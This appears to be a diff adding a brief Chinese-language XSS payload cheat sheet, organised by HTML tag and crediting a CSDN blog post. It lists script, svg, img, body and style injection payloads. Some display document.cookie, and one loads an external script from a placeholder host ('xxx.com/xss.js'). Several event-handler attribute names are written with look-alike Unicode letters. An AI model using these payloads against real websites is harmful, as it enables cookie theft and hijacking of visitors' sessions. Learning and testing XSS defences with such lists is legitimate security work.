@@ -1,0 +1,15 @@
+十、XSS		https://blog.csdn.net/qq_36119192/article/details/82469035
+<script>标签:
+	<script>alert("hack")</script>   #弹出hack
+	<script>alert(document.cookie)</script>      #弹出cookie
+	<script src=http://xxx.com/xss.js></script>  #引用外部的xss
+svg标签 :
+	<svg onload="alert(1)">
+<img>标签：
+	<img  src=1  οnerrοr=alert("hack")>
+	<img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
+<body>标签：
+	<body οnlοad=alert(1)>
+	<body οnpageshοw=alert(1)>
+style标签：
+	<style οnlοad=alert(1)></style>
